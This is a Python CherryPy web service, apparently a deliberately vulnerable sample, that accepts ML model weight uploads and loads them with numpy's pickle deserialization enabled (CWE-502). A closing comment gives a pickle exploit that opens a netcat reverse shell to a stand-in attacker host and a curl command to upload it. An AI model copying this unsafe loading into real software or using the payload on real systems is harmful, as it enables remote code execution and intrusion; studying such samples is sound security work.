import os
import io
import uuid
import sqlite3
import logging
import cherrypy
import numpy as np
from datetime import datetime

# Configure logging for the Edge ML Update Agent
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - EdgeMLAgent - %(levelname)s - %(message)s'
)
logger = logging.getLogger("ModelUpdater")

DB_FILE = "edge_ml_updates.db"

def init_update_db():
    """Initializes the SQLite database for tracking ML model updates."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE model_updates (
            update_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_ip TEXT NOT NULL,
            file_size INTEGER,
            status TEXT NOT NULL,
            details TEXT
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('upd_1a2b3c', datetime.now().isoformat(), '192.168.1.50', 10240, 'SUCCESS', 'Weights applied.'),
        ('upd_4d5e6f', datetime.now().isoformat(), '192.168.1.51', 0, 'FAILED', 'Empty file.')
    ]
    cursor.executemany('''
        INSERT INTO model_updates (update_id, timestamp, source_ip, file_size, status, details)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("ML Update tracking database initialized.")

def log_update_attempt(update_id: str, source_ip: str, file_size: int, status: str, details: str):
    """Records the outcome of a model update request."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO model_updates (update_id, source_ip, file_size, status, details) VALUES (?, ?, ?, ?, ?)",
            (update_id, source_ip, file_size, status, details)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging update {update_id}: {e}")

def apply_model_weights(file_data: bytes, update_id: str) -> bool:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: HTTP Multipart File Upload (NumPy .npy file payload)
    """
    logger.info(f"[{update_id}] Initiating model weight application.")
    
    try:
        # Vulnerability: The application uses numpy.load with allow_pickle=True 
        # to parse the uploaded `.npy` file. NumPy's format can embed pickled 
        # Python object arrays. Enabling allow_pickle permits an attacker to 
        # execute arbitrary system commands during the object reconstruction phase.
        
        buffer = io.BytesIO(file_data)
        
        # CWE-502 occurs instantly upon loading the malicious numpy array.
        weights = np.load(buffer, allow_pickle=True)
        
        # Dummy validation of the loaded weights
        if isinstance(weights, np.ndarray) and weights.size > 0:
            logger.debug(f"[{update_id}] Successfully loaded {weights.size} parameters.")
            # (In a real application, the weights would be applied to the neural network here)
            return True
        else:
            logger.warning(f"[{update_id}] Loaded array is empty or invalid type.")
            return False
            
    except Exception as e:
        logger.error(f"[{update_id}] Failed to deserialize model weights: {e}")
        return False

class EdgeModelAPI:
    """CherryPy Web Application for managing Edge ML nodes."""
    
    @cherrypy.expose
    @cherrypy.tools.json_out()
    def health(self):
        """Simple health check endpoint."""
        return {"status": "Edge ML Agent is active and awaiting updates."}

    @cherrypy.expose
    @cherrypy.tools.json_out()
    def update_weights(self, weight_file=None):
        """Endpoint to upload new model weights via multipart/form-data."""
        source_ip = cherrypy.request.remote.ip
        update_id = f"upd_{uuid.uuid4().hex[:8]}"
        
        if not weight_file:
            logger.warning(f"[{update_id}] Update failed: No file provided by {source_ip}.")
            log_update_attempt(update_id, source_ip, 0, "FAILED", "Missing file parameter")
            cherrypy.response.status = 400
            return {"error": "Missing 'weight_file' in form data"}
            
        try:
            # Read the uploaded binary data into memory
            file_data = weight_file.file.read()
            file_size = len(file_data)
            logger.info(f"[{update_id}] Received {file_size} bytes from {source_ip}")
            
            # Pass the untrusted file data directly to the vulnerable function
            success = apply_model_weights(file_data, update_id)
            
            if success:
                log_update_attempt(update_id, source_ip, file_size, "SUCCESS", "Weights applied successfully")
                return {"message": "Model updated successfully", "update_id": update_id}
            else:
                log_update_attempt(update_id, source_ip, file_size, "FAILED", "Invalid format or execution error")
                cherrypy.response.status = 422
                return {"error": "Failed to process weight file"}
                
        except Exception as e:
            logger.error(f"[{update_id}] Internal server error handling upload: {e}")
            log_update_attempt(update_id, source_ip, 0, "ERROR", str(e))
            cherrypy.response.status = 500
            return {"error": "Internal server error"}

if __name__ == "__main__":
    init_update_db()
    
    cherrypy.config.update({
        'server.socket_host': '0.0.0.0',
        'server.socket_port': 8080,
        'log.screen': False
    })
    
    logger.info("Starting CherryPy Edge ML Agent on http://0.0.0.0:8080")
    
    # Example Malicious Trigger:
    # 1. Attacker generates a malicious .npy file using numpy and a custom object with __reduce__:
    #    class Exploit:
    #        def __reduce__(self):
    #            import os
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    
    #    malicious_array = np.array([Exploit()])
    #    np.save('payload.npy', malicious_array)
    #
    # 2. Attacker uploads the payload to the API:
    #    curl -X POST -F "weight_file=@payload.npy" http://127.0.0.1:8080/update_weights
    
    cherrypy.quickstart(EdgeModelAPI())
